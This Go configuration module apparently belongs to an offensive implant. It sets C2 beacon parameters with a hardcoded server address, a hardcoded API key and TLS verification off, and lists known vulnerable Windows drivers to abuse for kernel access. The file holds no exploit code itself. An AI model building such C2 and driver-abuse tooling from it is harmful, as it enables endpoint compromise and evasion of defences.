package config

import (
	"encoding/json"
	"fmt"
	"os"
)

// Config represents the complete application configuration
type Config struct {
	C2      C2Config      `json:"c2"`
	Logging LoggingConfig `json:"logging"`
	BYOVD   BYOVDConfig   `json:"byovd"`
}

// C2Config contains C2 server configuration
type C2Config struct {
	ServerURL         string `json:"server_url"`
	APIKey            string `json:"api_key"`
	SkipTLSVerify     bool   `json:"skip_tls_verify"`
	TimeoutSeconds    int    `json:"timeout_seconds"`
	RequestTimeout    int    `json:"request_timeout"`
	HeartbeatInterval int    `json:"heartbeat_interval"`
	CheckinInterval   int    `json:"checkin_interval"`
	RetryAttempts     int    `json:"retry_attempts"`
	RetryDelayMs      int    `json:"retry_delay_ms"`
	PollIntervalSec   int    `json:"poll_interval_sec"`
}

// LoggingConfig contains logging configuration
type LoggingConfig struct {
	Level      string `json:"level"`
	OutputFile string `json:"output_file,omitempty"`
}

// BYOVDConfig contains BYOVD-specific configuration
type BYOVDConfig struct {
	PreferredDriver string   `json:"preferred_driver,omitempty"`
	ScanDrivers     []string `json:"scan_drivers"`
	TestMode        bool     `json:"test_mode"`
	MemoryScanSize  int      `json:"memory_scan_size"`
}

// LoadConfig loads configuration from file
func LoadConfig(configPath string) (*Config, error) {
	// Default configuration
	config := &Config{
		C2: C2Config{
			ServerURL:       "http://192.168.10.29:8080",
			APIKey:          "shadowkernel-prod-key-2025",
			SkipTLSVerify:   true,
			TimeoutSeconds:  30,
			RetryAttempts:   5,
			RetryDelayMs:    1000,
			PollIntervalSec: 30,
		},
		Logging: LoggingConfig{
			Level: "info",
		},
		BYOVD: BYOVDConfig{
			PreferredDriver: "RTCore64.sys",
			ScanDrivers: []string{
				"RTCore64.sys",
				"DBUtilDrv2.sys", 
				"atszio64.sys",
				"gdrv.sys",
				"KProcessHacker.sys",
			},
			TestMode:       false,
			MemoryScanSize: 1024 * 1024, // 1MB default scan size
		},
	}

	// Load from file if it exists
	if _, err := os.Stat(configPath); err == nil {
		data, err := os.ReadFile(configPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read config file: %v", err)
		}

		err = json.Unmarshal(data, config)
		if err != nil {
			return nil, fmt.Errorf("failed to parse config file: %v", err)
		}
	}

	return config, nil
}

// SaveConfig saves configuration to file
func (c *Config) SaveConfig(configPath string) error {
	data, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal config: %v", err)
	}

	err = os.WriteFile(configPath, data, 0600)
	if err != nil {
		return fmt.Errorf("failed to write config file: %v", err)
	}

	return nil
}
